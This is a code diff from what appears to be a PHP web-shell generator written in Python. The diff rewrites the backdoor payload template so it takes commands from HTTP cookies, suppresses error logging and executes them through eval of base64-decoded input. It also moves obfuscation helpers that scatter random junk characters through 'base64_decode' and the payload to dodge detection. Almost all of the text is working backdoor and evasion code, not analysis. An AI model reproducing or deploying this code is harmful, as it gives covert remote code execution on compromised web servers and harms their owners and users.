@@ -18,6 +18,7 @@
 # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 import base64, codecs
 from random import random, randrange, choice, shuffle
+from pollution import random_string, pollute_string
 
 class Backdoor:
 #	payload_template_old= """
@@ -29,21 +30,29 @@ class Backdoor:
 #echo '</%%%END_KEY%%%>';
 #}
 #"""
+
 	payload_template= """
-function z($a) {
-if(reset($a)=='%%%START_KEY%%%' && count($a)>3) {
-ini_set('error_log', '/dev/null');
+$a=$_COOKIE; if(reset($a)=='%%%START_KEY%%%' && count($a)>3){ini_set('error_log', '/dev/null');
 echo '<%%%END_KEY%%%>';
-eval(base64_decode(str_replace(" ", "+", join(array_slice($a,count($a)-3)))));
-echo '</%%%END_KEY%%%>';
-$b=0;
-}
-}
-$b=1;
-$ss=$_SERVER;$rr='HTTP_REFERER';
-if(array_key_exists($rr,$ss)){parse_str($ss[$rr],$r);z($r);}
-elseif($b) z($_COOKIE);	
+eval(base64_decode(preg_replace(array('/[^\w+=]/','/[+]/'), array('',' '), join(array_slice($a,count($a)-3)))));
+echo '</%%%END_KEY%%%>';}
 """
+
+#	payload_template= """
+#function z($a) {
+#if(reset($a)=='%%%START_KEY%%%' && count($a)>3) {
+#ini_set('error_log', '/dev/null');
+#echo '<%%%END_KEY%%%>';
+#eval(base64_decode(str_replace(" ", "+", join(array_slice($a,count($a)-3)))));
+#echo '</%%%END_KEY%%%>';
+#$b=0;
+#}
+#}
+#$b=1;
+#$ss=$_SERVER;$rr='HTTP_REFERER';
+#if(array_key_exists($rr,$ss)){parse_str($ss[$rr],$r);z($r);}
+#elseif($b) z($_COOKIE);	
+#"""
 
 	#backdoor_template = "<?php eval(base64_decode('%%%PAYLOAD%%%')); ?>"
 	
@@ -73,47 +82,15 @@ eval($%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLLUTION%%", "", $%%PAY_VAR%%1.$%%
 	def __str__( self ):
 		return self.backdoor
 
-	def __random_string(self, len=4, fixed=False):
-		if not fixed:
-			len = randrange(2,len)
-		return ''.join([choice('abcdefghijklmnopqrstuvwxyz') for i in xrange(len)])
-		
-	def __pollute_string(self, str, frequency=0.1):
-
-		while True:
-			pollution_chars = self.__random_string(16, True)
-	
-			pollution = ''
-			for i in range(0, len(pollution_chars)):
-				pollution = pollution_chars[:i]
-				if (not pollution in str) :
-					break
-				
-			if not pollution:
-				print '[!] Bad randomization, retrying.'
-			else:
-				break
-			
-		str_encoded = ''
-		for char in str:
-			if random() < frequency:
-				str_encoded += pollution + char
-			else:
-				str_encoded += char
-				
-		return pollution, str_encoded
-		
-		
-
 	def encode_template(self):
 		
-		b64_new_func_name = self.__random_string()
-		b64_pollution, b64_polluted = self.__pollute_string('base64_decode',0.7)
+		b64_new_func_name = random_string()
+		b64_pollution, b64_polluted = pollute_string('base64_decode',frequency=0.7)
 		
-		payload_var = self.__random_string()
-		payload_pollution, payload_polluted = self.__pollute_string(base64.b64encode(self.payload))
+		payload_var = random_string()
+		payload_pollution, payload_polluted = pollute_string(base64.b64encode(self.payload))
 		
-		replace_new_func_name = self.__random_string()
+		replace_new_func_name = random_string()
 		
 		
 		length  = len(payload_polluted)
